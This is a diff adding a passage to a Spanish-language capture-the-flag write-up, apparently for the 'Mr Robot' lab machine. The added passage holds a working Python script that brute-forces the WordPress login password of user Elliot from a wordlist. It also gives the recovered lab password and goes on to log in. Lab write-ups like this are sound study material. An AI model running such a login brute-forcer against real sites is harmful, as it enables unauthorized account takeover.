@@ -127,3 +127,46 @@ with open('fsocity.dic', 'r') as f:
   </p>
 
   Ahora que tenemos el usuario haremos una fuerza bruta a la password del usuario **Elliot**, para esto adapataremos un poco el script para que ahora itere sobre la password y no el usuario:
+
+  ```python
+#!/usr/bin/python
+
+import requests, time
+from pwn import *
+
+url = 'http://10.10.7.71/wp-login.php'
+user = 'Elliot'
+s = requests.Session()
+
+print ''
+
+p1 = log.progress('Fuzzeando password')
+time.sleep(2)
+p1.status('Iniciando Fuzzing')
+time.sleep(3)
+
+with open('smallwordlist', 'r') as f:
+
+	for i in f:
+
+		data  = {
+			'log' : user,
+			'pwd' : i
+ 		}
+
+		r = s.post(url, data)
+		p1.status('Probando password %s' % i.strip('\n'))
+
+		if 'The password you entered for the username ' not in r.text:
+
+			p1.success('La passwor de Elliot es %s' % i.strip('\n'))
+			break
+
+  ```
+  Yo acote el diccionario ya que eran demasiadas lineas, la constraseña se encontraba en la linea 5627:ER28-0652, seria un gran punto si le metieramos hilos pero en esta ocasion no lo hare yo.
+
+  <p align="center">
+  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/fuzzp.png">
+  </p>
+
+  Ya que encontramos el usuario y la passwod vamos al login de wordpress y ingresamos con las credenciales.
